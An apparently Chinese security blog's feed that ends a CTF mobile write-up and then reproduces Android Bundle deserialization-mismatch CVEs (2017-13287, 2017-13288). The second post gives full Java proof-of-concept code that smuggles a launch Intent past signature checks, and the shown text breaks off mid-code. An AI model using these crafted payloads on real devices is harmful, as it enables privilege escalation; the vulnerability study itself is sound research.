<span class="keyword">this</span>.matrix[<span class="number">6</span>][<span class="number">7</span>].getStatus() == <span class="number">1</span> </span><br><span class="line">            &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">7</span>][<span class="number">3</span>].getStatus() == <span class="number">1</span> &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">7</span>][<span class="number">6</span>].getStatus() == <span class="number">1</span> </span><br><span class="line">            &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">8</span>][<span class="number">4</span>].getStatus() == <span class="number">1</span> &amp;&amp; <span class="keyword">this</span>.matrix[<span class="number">8</span>][<span class="number">5</span>].getStatus() == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/cap.png" alt="cap" style="zoom:33%;" /><p>其实把所有圈都点了也能通过，不过这个题只静态分析就行。</p><p>关注<code>xyz.konso.testsrtp.background$4.onResult()</code>这个回调函数：<br>这里接入了科大讯飞的语音SDK，传入的results会被解析为文本信息然后传入<code>getsna()</code>中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResult</span><span class="params">(RecognizerResult results, <span class="keyword">boolean</span> isLast)</span> </span>&#123;</span><br><span class="line">    Log.d(background.<span class="keyword">this</span>.TAG, results.getResultString());</span><br><span class="line">    String str = results.getResultString();<span class="comment">//解析为文本信息，返回一个JSON对象</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        background.<span class="keyword">this</span>.ss = <span class="keyword">new</span> JSONObject(str).getJSONArray(<span class="string">&quot;ws&quot;</span>).getJSONObject(<span class="number">0</span>).getJSONArray(<span class="string">&quot;cw&quot;</span>).getJSONObject(<span class="number">0</span>).getString(<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">        Log.d(background.<span class="keyword">this</span>.TAG, <span class="string">&quot;catch Excepetion&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    background.<span class="keyword">this</span>.getsna(background.<span class="keyword">this</span>.ss);</span><br><span class="line">    Log.d(background.<span class="keyword">this</span>.TAG, background.<span class="keyword">this</span>.ss);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>getsna()</code>中，逻辑比较简单，输入的flag参数去utf-8解码出来是<code>我是傻逼</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getsna</span><span class="params">(String flag)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(flag.length() != <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span>[] as = <span class="keyword">new</span> <span class="keyword">int</span>[flag.length()];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; flag.length(); ++i) &#123;</span><br><span class="line">        as[i] = flag.charAt(i) &amp; <span class="number">0xFFFF</span>;<span class="comment">// string to int</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;<span class="comment">//排序</span></span><br><span class="line">        <span class="keyword">int</span> k;</span><br><span class="line">        <span class="keyword">for</span>(k = j + <span class="number">1</span>; k &lt; <span class="number">4</span>; ++k) &#123;</span><br><span class="line">            <span class="keyword">if</span>(as[j] &gt; as[k]) &#123;</span><br><span class="line">                <span class="keyword">int</span> temp = as[j];</span><br><span class="line">                as[j] = as[k];</span><br><span class="line">                as[k] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//           ‘傻’              ‘我’               ‘是’                 ‘逼’</span></span><br><span class="line">    <span class="keyword">if</span>(as[<span class="number">0</span>] == <span class="number">0x50BB</span> &amp;&amp; as[<span class="number">1</span>] == <span class="number">25105</span> &amp;&amp; as[<span class="number">2</span>] == <span class="number">0x662F</span> &amp;&amp; as[<span class="number">3</span>] == <span class="number">0x903C</span>) &#123;</span><br><span class="line">        Toast.makeText(<span class="keyword">this</span>.getContext(), <span class="string">&quot;You get the sorted flag：20667 25105 26159 36924&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Toast.makeText(<span class="keyword">this</span>.getContext(), <span class="string">&quot;wrong input&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是提交的flag形式是啥还是不知道。<br><code>makeText</code>提示<code>sorted flag=20667 25105 26159 36924</code>，那么<code>original flag=25105 26159 20667 36924</code>，且需要保留空格。<br>最后这一步我是真没想到，看来我真是傻逼了。<code>: (</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;攻防世界刷题：Mobile， Easy部分。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Android" scheme="http://slient2009.github.io/tags/Android/"/>
    
    <category term="CTF" scheme="http://slient2009.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>几个Android反序列化漏洞复现</title>
    <link href="http://slient2009.github.io/2021/10/02/Android-CVEs-of-Parcel/"/>
    <id>http://slient2009.github.io/2021/10/02/Android-CVEs-of-Parcel/</id>
    <published>2021-10-02T04:00:01.000Z</published>
    <updated>2021-12-10T17:48:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>参考相关文章，完成一下Android的几个反序列化漏洞的PoC代码。原理是相似的，只是出现序列化缺陷的类有不同，构造方法也有细微的区别。</p><p>CEV-2017-13311和CVE-2017-13315只能以后有时间再补上了。</p><span id="more"></span><p><a href="https://xz.aliyun.com/t/2364#toc-2">Bundle风水——Android序列化与反序列化不匹配漏洞详解 - 先知社区 (aliyun.com)</a></p><table><thead><tr><th>CVE</th><th>Parcelable对象</th><th>公布时间</th></tr></thead><tbody><tr><td><a href="https://android.googlesource.com/platform/frameworks/base/+/b87c968e5a41a1a09166199bf54eee12608f3900">CVE-2017-0806</a></td><td>GateKeeperResponse</td><td>2017.10</td></tr><tr><td><a href="https://android.googlesource.com/platform/frameworks/base/+/47ebfaa2196aaf4fbeeec34f1a1c5be415cf041b^!/#F0">CVE-2017-13286</a></td><td>OutputConfiguration</td><td>2018.04</td></tr><tr><td><a href="https://android.googlesource.com/platform/frameworks/base/+/09ba8fdffd9c8d74fdc6bfb51bcebc27fc43884a">CVE-2017-13287</a></td><td>VerifyCredentialResponse</td><td>2018.04</td></tr><tr><td><a href="https://android.googlesource.com/platform/frameworks/base/+/b796cd32a45bcc0763c50cc1a0cc8236153dcea3">CVE-2017-13288</a></td><td>PeriodicAdvertisingReport</td><td>2018.04</td></tr><tr><td><a href="https://android.googlesource.com/platform/frameworks/base/+/5a3d2708cd2289a4882927c0e2cb0d3c21a99c02">CVE-2017-13289</a></td><td>ParcelableRttResults</td><td>2018.04</td></tr><tr><td><a href="https://android.googlesource.com/platform/frameworks/base/+/2950276f61220e00749f8e24e0c773928fefaed8">CVE-2017-13311</a></td><td>SparseMappingTable</td><td>2018.05</td></tr><tr><td><a href="https://android.googlesource.com/platform/frameworks/base/+/35bb911d4493ea94d4896cc42690cab0d4dbb78f">CVE-2017-13315</a></td><td>DcParamObject</td><td>2018.05</td></tr></tbody></table><h1 id="CVE-2017-13286"><a href="#CVE-2017-13286" class="headerlink" title="CVE-2017-13286"></a>CVE-2017-13286</h1><p>详细分析在之前的一篇文章：<a href="https://slient2009.github.io/2021/08/31/CVE-2017-13286/">CVE-2017-13286 复现 | Slient2009</a></p><h1 id="CVE-2017-13287"><a href="#CVE-2017-13287" class="headerlink" title="CVE-2017-13287"></a>CVE-2017-13287</h1><p>对应的类是<a href="https://android.googlesource.com/platform/frameworks/base/+/a4e80ee2cdae43fb92d3560924bce5e33cdb9c4c/core/java/com/android/internal/widget/VerifyCredentialResponse.java">core/java/com/android/internal/widget/VerifyCredentialResponse.java</a></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912114212610.png" alt="image-20210912114212610"></p><p>当<code>mResponseCode=RESPONSE_OK=0</code>时，一定会从<code>Parcel</code>中再读取一个<code>int</code>视作<code>mPayload</code>的长度，但是在序列化过程中，只会在<code>mPayload!=null</code>才会写出<code>PayloadSize</code>和<code>mPayload</code>。<br>如果构造<code>ResponseCode=0</code>和<code>size=0</code>，在反序列化过程中，会读入这两个值，并且使得<code>Payload=null</code>。但是在序列化过程中，只会写出<code>ResponseCode=0</code>。由此，导致了内存在序列化前后的不一致。<br>具体构造方法如下：</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912160551139.png" alt="image-20210912160551139"></p><ol><li>构造一个<code>VerifyCredentialResponse</code>，<code>responseCode=0</code>且<code>payloadSize=0</code>，但是不会读入<code>payloadByteArray</code>。构造一个<code>ByteArray</code>对象，<code>key=0xC11171</code>（末尾的<code>0</code>表示String的阶段），<code>value</code>中内含一个恶意<code>intent</code>。后加一个<code>String</code>对象用于填充。</li><li>第二次序列化时，<code>VerifyCredentialResponse</code>不会写出<code>payloadSize=0</code>，但是在第二次反序列化时会读入<code>payloadSize=0x0C</code>。<br>因此在反序列化过程中，后续的<code>0xC111</code>作为<code>payload</code>被读入。需要注意的是，<code>payload</code>的读入具体由<a href="https://android.googlesource.com/platform/frameworks/base/+/a4e80ee2cdae43fb92d3560924bce5e33cdb9c4c/core/jni/android_os_Parcel.cpp">android_os_Parcel_readByteArray()</a>完成，<code>0xC=12</code>将被视作<code>byte array</code>的长度，<code>0x111</code>是具体内容。<br>因此，后续的<code>0x7</code>被视作第二个键的长度，接下来的<code>0</code>、<code>D</code>以及<code>L(原bytes的长度)</code>被解析为键名，<code>0x6</code>表示键值是个<code>Long</code>，<code>LONG</code>是具体的数值。<br>接着，<code>intent</code>就暴露出来，从而绕过了<code>intent</code>的签名检查。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// core.java.android.os.Parcel.java中使用的native函数，在core.jni.android_os_Parcel.cpp中</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> jboolean <span class="title">android_os_Parcel_readByteArray</span><span class="params">(JNIEnv* env, jclass clazz, jlong nativePtr, jobject dest, jint destLen)</span></span>&#123;</span><br><span class="line">    jboolean ret = JNI_FALSE;</span><br><span class="line">    Parcel* parcel = <span class="keyword">reinterpret_cast</span>&lt;Parcel*&gt;(nativePtr);</span><br><span class="line">    <span class="keyword">if</span> (parcel == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int32_t</span> len = parcel-&gt;<span class="built_in">readInt32</span>();<span class="comment">//先读length</span></span><br><span class="line">    <span class="keyword">if</span> (len &gt;= <span class="number">0</span> &amp;&amp; len &lt;= (<span class="keyword">int32_t</span>)parcel-&gt;<span class="built_in">dataAvail</span>() &amp;&amp; len == destLen) &#123;<span class="comment">//还要校验两次声明的长度是否一致，否则抛出异常</span></span><br><span class="line">        jbyte* ar = (jbyte*)env-&gt;<span class="built_in">GetPrimitiveArrayCritical</span>((jarray)dest, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (ar) &#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="keyword">void</span>* data = parcel-&gt;<span class="built_in">readInplace</span>(len);</span><br><span class="line">            <span class="built_in">memcpy</span>(ar, data, len);</span><br><span class="line">            env-&gt;<span class="built_in">ReleasePrimitiveArrayCritical</span>((jarray)dest, ar, <span class="number">0</span>);</span><br><span class="line">            ret = JNI_TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Bundle <span class="title">poc2017_13287</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Bundle retBundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">    Parcel bundleData = Parcel.obtain();</span><br><span class="line">    Parcel craftData = Parcel.obtain();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//craftData是传递的Bundle载荷，这里手动构造载荷内容，然后补上Bundle格式头</span></span><br><span class="line">    craftData.writeInt(<span class="number">3</span>); <span class="comment">// 总共传递3个对象,三个key-value对</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第一个Key为VerifyCredentialResponse，它将用来引起内存错位从而绕过检查</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;object1&quot;</span>);<span class="comment">//是这个object的名字,似乎长度有些要求</span></span><br><span class="line">    craftData.writeInt(<span class="number">4</span>); <span class="comment">// VAL_PARCELABLE = 4</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;com.android.internal.widget.VerifyCredentialResponse&quot;</span>); <span class="comment">// value类型VerifyCredentialResponse </span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>);<span class="comment">//responseCode=0 RESPONSE_ERROR=-1 RESPONSE_OK=0 RESPONSE_RETRY=1 这里需要OK使得去尝试读PayloadSize字段</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>);<span class="comment">//PayloadSize=0 读入payload为null，但是不会写出payloadSize=0，从这里开始造成错位</span></span><br><span class="line"></span><br><span class="line">    craftData.writeInt(<span class="number">12</span>);<span class="comment">//第二个key的长度，后来被解析为PayloadSize</span></span><br><span class="line">    craftData.writeInt(<span class="number">12</span>);<span class="comment">//第二个key的值，后来被解析为payloadBytesLength，参看Parcel的native readByteArray(),发现byteArray的第一个int表示了byteArray的长度，且PayloadSize应该等于ByteArrayLength，否则要抛异常</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">7</span>);<span class="comment">//</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">0</span>);<span class="comment">//这个0用于表示string的结束</span></span><br><span class="line"></span><br><span class="line">    craftData.writeInt(<span class="number">13</span>);<span class="comment">//VAL_BYTEARRAY = 13,后来被解析为第二个key的长度</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接下来构造ByteArray，或者说内含Intent的ByteArray</span></span><br><span class="line">    craftData.writeInt(-<span class="number">1</span>); <span class="comment">// 这个位置用于存放ByteArray部分的长度，先占位，构造完之后再来写入</span></span><br><span class="line">    <span class="keyword">int</span> ByteArrayStartPos = craftData.dataPosition();  <span class="comment">// 记录ByteArray部分在craftData中起始位置，因为接下来要构造ByteArray了</span></span><br><span class="line"></span><br><span class="line">    craftData.writeInt(<span class="number">6</span>);</span><br><span class="line">    craftData.writeLong(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    craftData.writeString(AccountManager.KEY_INTENT);<span class="comment">// 第二个object是个intent</span></span><br><span class="line">    craftData.writeInt(<span class="number">4</span>); <span class="comment">//intent也是一个parcel</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;android.content.Intent&quot;</span>);<span class="comment">// value类型为intent，将被按照intent格式解析</span></span><br><span class="line">    craftData.writeString(Intent.ACTION_RUN); <span class="comment">// Intent Action 这里开始是intent的属性</span></span><br><span class="line">    Uri.writeToParcel(craftData, <span class="keyword">null</span>); <span class="comment">// Uri</span></span><br><span class="line">    craftData.writeString(<span class="keyword">null</span>); <span class="comment">// Type</span></span><br><span class="line">    craftData.writeInt(<span class="number">0x10000000</span>); <span class="comment">// Flags</span></span><br><span class="line">    craftData.writeString(<span class="keyword">null</span>); <span class="comment">// Package</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;com.android.settings&quot;</span>);</span><br><span class="line">    craftData.writeString(<span class="string">&quot;com.android.settings.ChooseLockPassword&quot;</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//SourceBounds</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//Categories</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//Selector</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//ClipData</span></span><br><span class="line">    craftData.writeInt(-<span class="number">2</span>); <span class="comment">//ContentUserHint</span></span><br><span class="line">    craftData.writeBundle(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ByteArrayEndPos = craftData.dataPosition(); <span class="comment">// byteArray到此结束，记录结束位置</span></span><br><span class="line">    <span class="keyword">int</span> ByteArrayLength = ByteArrayEndPos - ByteArrayStartPos; <span class="comment">// 计算ByteArray数据的长度</span></span><br><span class="line">    craftData.setDataPosition(ByteArrayStartPos - <span class="number">4</span>);  <span class="comment">// 把读写指针位移动到ByteArray部分起始位-4,即-1所在的位置</span></span><br><span class="line">    craftData.writeInt(ByteArrayLength);<span class="comment">// 在ByteArray部分前写入ByteArray这段数据的长度</span></span><br><span class="line">    craftData.setDataPosition(ByteArrayEndPos);<span class="comment">// 将读写指针移动到最后</span></span><br><span class="line">    Log.i(TAG, <span class="string">&quot;the length of INTENT = &quot;</span> + ByteArrayLength);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里做个用于填充的键值对</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;PaddingK&quot;</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">// VAL_STRING</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;PaddingV&quot;</span>); <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> length  = craftData.dataSize();</span><br><span class="line">    bundleData.writeInt(length); <span class="comment">//所有数据的长度</span></span><br><span class="line">    bundleData.writeInt(<span class="number">0x4c444E42</span>); <span class="comment">//Bundle魔数</span></span><br><span class="line">    bundleData.appendFrom(craftData, <span class="number">0</span>, length); <span class="comment">//</span></span><br><span class="line">    bundleData.setDataPosition(<span class="number">0</span>);<span class="comment">//移动Parcel的读写指针位置到开头</span></span><br><span class="line">    retBundle.readFromParcel(bundleData);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retBundle;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>修复措施：<a href="https://android.googlesource.com/platform/frameworks/base/+/09ba8fdffd9c8d74fdc6bfb51bcebc27fc43884a^!/">Diff - 09ba8fdffd9c8d74fdc6bfb51bcebc27fc43884a^! - platform/frameworks/base - Git at Google (googlesource.com)</a></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912202251144.png" alt="image-20210912202251144"></p><h1 id="CVE-2017-13288"><a href="#CVE-2017-13288" class="headerlink" title="CVE-2017-13288"></a>CVE-2017-13288</h1><p>对应的类是<a href="https://android.googlesource.com/platform/frameworks/base/+/refs/tags/android-8.0.0_r1/core/java/android/bluetooth/le/PeriodicAdvertisingReport.java">core/java/android/bluetooth/le/PeriodicAdvertisingReport.java</a></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912162607553.png" alt="image-20210912162607553"></p><p>这个漏洞类似于CVE-2017-13286，相当于都是多写了一个<code>int</code>，构造方法如图所示：</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210912163413323.png" alt="image-20210912163413323"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Bundle <span class="title">poc2017_13288</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Bundle retBundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">    Parcel bundleData = Parcel.obtain();</span><br><span class="line">    Parcel craftData = Parcel.obtain();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//craftData是传递的Bundle载荷，这里手动构造载荷内容，然后补上Bundle格式头</span></span><br><span class="line">    craftData.writeInt(<span class="number">3</span>); <span class="comment">// 总共传递3个对象,三个key-value对</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第一个Key为VerifyCredentialResponse，它将用来引起内存错位从而绕过检查</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;PARPAR&quot;</span>);<span class="comment">//是这个object的名字,似乎长度有些要求</span></span><br><span class="line">    craftData.writeInt(<span class="number">4</span>); <span class="comment">// VAL_PARCELABLE = 4</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;android.bluetooth.le.PeriodicAdvertisingReport&quot;</span>); <span class="comment">// value类型PeriodicAdvertisingReport</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//syncHandle</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//txPower INT to LONG</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//rssi</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//dataStatus</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//isData</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//BytesLength</span></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//Bytes</span></span><br><span class="line"></span><br><span class="line">    craftData.writeInt(<span class="number">1</span>);<span class="comment">//第二个Key的长度，后来被解析为payloadSize</span></span><br><span class="line">    craftData.writeInt(<span class="number">6</span>);<span class="comment">//第二个Key的值，后来被接卸为payloadByteArray</span></span><br><span class="line">    craftData.writeInt(<span class="number">13</span>);<span class="comment">//VAL_BYTEARRAY = 13,后来被解析为第二个key的长度</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接下来构造ByteArray，或者说内含Intent的ByteArray</span></span><br><span class="line">    craftData.writeInt(-<span class="number">1</span>); <span class="comment">// 这个位置用于存放ByteArray部分的长度，先占位，构造完之后再来写入</span></span><br><span class="line">    <span class="keyword">int</span> ByteArrayStartPos = craftData.dataPosition();  <span class="comment">// 记录ByteArray部分在craftData中起始位置，因为接下来要构造ByteArray了</span></span><br><span class="line"></span><br><span class="line">    craftData.writeString(AccountManager.KEY_INTENT);</span><br><span class="line">    craftData.writeInt(<span class="number">4</span>); <span class="comment">//intent也是一个parcel</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;android.content.Intent&quot;</span>);<span class="comment">// value类型为intent，将被按照intent格式解析</span></span><br><span class="line">    craftData.writeString(Intent.ACTION_RUN); <span class="comment">// Intent Action 这里开始是intent的属性</span></span><br><span class="line">    Uri.writeToParcel(craftData, <span class="keyword">null</span>); <span class="comment">// Uri</span></span><br><span class="line">    craftData.writeString(<span class="keyword">null</span>); <span class="comment">// Type</span></span><br><span class="line">    craftData.writeInt(<span class="number">0x10000000</span>); <span class="comment">// Flags</span></span><br><span class="line">    craftData.writeString(<span class="keyword">null</span>); <span class="comment">// Package</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;com.android.settings&quot;</span>);</span><br><span class="line">    craftData.writeString(<span class="string">&quot;com.android.settings.ChooseLockPassword&quot;</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//SourceBounds</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//Categories</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//Selector</span></span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">//ClipData</span></span><br><span class="line">    craftData.writeInt(-<span class="number">2</span>); <span class="comment">//ContentUserHint</span></span><br><span class="line">    craftData.writeBundle(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ByteArrayEndPos = craftData.dataPosition(); <span class="comment">// byteArray到此结束，记录结束位置</span></span><br><span class="line">    <span class="keyword">int</span> ByteArrayLength = ByteArrayEndPos - ByteArrayStartPos; <span class="comment">// 计算ByteArray数据的长度</span></span><br><span class="line">    craftData.setDataPosition(ByteArrayStartPos - <span class="number">4</span>);  <span class="comment">// 把读写指针位移动到ByteArray部分起始位-4,即-1所在的位置</span></span><br><span class="line">    craftData.writeInt(ByteArrayLength);<span class="comment">// 在ByteArray部分前写入ByteArray这段数据的长度</span></span><br><span class="line">    craftData.setDataPosition(ByteArrayEndPos);<span class="comment">// 将读写指针移动到最后</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里做个用于填充的键值对</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;Padding&quot;</span>);</span><br><span class="line">    craftData.writeInt(<span class="number">0</span>); <span class="comment">// VAL_STRING</span></span><br><span class="line">    craftData.writeString(<span class="string">&quot;Padding&quot;</span>); <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> length  = craftData.dataSize();</span><br><span class="line">    bundleData.writeInt(length); <span class="comment">//所有数据的长度</span></span><br><span class="line">    bundleData.writeInt(<span class="number">0x4c444E42</span>); <span class="comment">//Bundle魔数</span></span><br><span class="line">    bundleData.appendFrom(craftData, 